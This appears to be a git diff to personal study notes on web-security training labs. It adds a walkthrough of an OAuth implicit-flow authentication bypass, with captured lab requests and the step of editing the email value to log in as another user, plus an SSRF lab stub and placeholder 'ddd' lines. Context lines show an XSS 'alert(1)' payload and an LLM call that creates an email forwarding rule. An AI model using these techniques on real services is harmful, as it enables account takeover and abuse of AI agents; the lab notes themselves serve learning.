@@ -3673,7 +3673,6 @@ LLM -> API: create_email_forwarding_rule('peter')
 
     alert(1)$$#
     ```
-  - 
 - **Internal cache poisoning (Expert)**
   - Keep sending the request
     ```
@@ -4906,7 +4905,33 @@ Response: Communication timed out. (chunked size is 5)
 **SAML 2.0 asseertion flow**
 ![SAML 2.0 Assertion flow](https://developer.okta.com/img/authorization/oauth-saml2-assertion-grant-flow.png)
 
-### OAuth Authenticatio Lab
+### OAuth Authentication Lab
+- Authentication bypass via OAuth implicit flow
+  - an attacker to log in to other users' accounts without knowing their password
+  - traffic
+    ```
+    My Account (wiener:peter)
+    GET /auth?client_id=h7egzr53m5f1v57zwum12&redirect_uri=https://0aa900ca04d1a64dc79b634900790017.web-security-academy.net/oauth-callback&response_type=token&nonce=-1910288671&scope=openid%20profile%20email
+
+    Sign-In
+    GET /authenticate HTTP/2
+    Host: 0aa900ca04d1a64dc79b634900790017.web-security-academy.net
+
+    GET /oauth-callback HTTP/2
+    Host: 0aa900ca04d1a64dc79b634900790017.web-security-academy.net
+
+    POST /authenticate HTTP/2
+    Host: 0aa900ca04d1a64dc79b634900790017.web-security-academy.net
+    {"email":"wiener@hotdog.com","username":"wiener","token":"V4-AjsLZ2zep91RbNL7_IJc4wrCDRksGBfxbIVFpZj-"}
+    ```
+  - POST /authenticate > send to repeater > modify the email value "carlos@carlos-montoya.net" > show response in browser > carlos login
+- SSRF via OpenID dynamic client registration
+  - This lab allows client applications to dynamically register themselves with the OAuth service via a dedicated registration endpoint. Some client-specific data is used in an unsafe way by the OAuth service, which exposes a potential vector for SSRF.
+  - 
+- ddd
+- ddd
+- ddd
+- ddd
 
 ## JWT Attacks
 Content for JWT Attacks...
@@ -4920,6 +4945,8 @@ Content for Prototype Pollution...
 
 ## Essential Skills
 Content for Essential Skills...
+
+### Essential Skills Lab
 
 # Windows installation tools
 1. Burp Suite Pro
